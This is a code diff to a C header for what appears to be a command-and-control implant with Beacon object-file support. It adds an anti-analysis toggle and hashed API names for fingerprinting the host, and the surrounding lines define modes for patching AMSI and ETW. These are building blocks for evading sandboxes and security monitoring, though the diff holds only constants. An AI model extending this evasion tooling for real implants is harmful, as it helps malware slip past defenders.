@@ -46,6 +46,9 @@
 #define AMSIETW_PATCH_HWBP                           1
 #define AMSIETW_PATCH_MEMORY                         2
 
+/* Anti-Analysis feature toggle — uncomment to enable */
+// #define ANTI_ANALYSIS
+
 /* Win32 Functions — FNV-1a hashes (uppercase) */
 #define H_FUNC_LDRLOADDLL                                    0xb8f2a332
 #define H_FUNC_LDRGETPROCEDUREADDRESS                        0xac141575
@@ -284,6 +287,13 @@
 #define H_FUNC_GLOBALFREE                                    0x744734c9
 #define H_FUNC_SWPRINTF_S                                    0xe8e55b5f
 
+// Anti-Analysis API hashes
+#define H_FUNC_GLOBALMEMORYSTATUSEX                          0xd0afa933
+#define H_FUNC_GETDISKFREESPACEEXW                           0x747d51b7
+#define H_FUNC_GETSYSTEMINFO                                 0x7734b1a1
+#define H_FUNC_GETCOMPUTERNAMEW                              0xbbc031bf
+#define H_FUNC_GETUSERNAMEW                                  0xbab609d5
+#define H_FUNC_GETADAPTERSINFO                               0x44152228
 
 // Beacon API — FNV-1a hashes (case-sensitive)
 #define H_COFFAPI_BEACONDATAPARSER                           0x82b8dec7
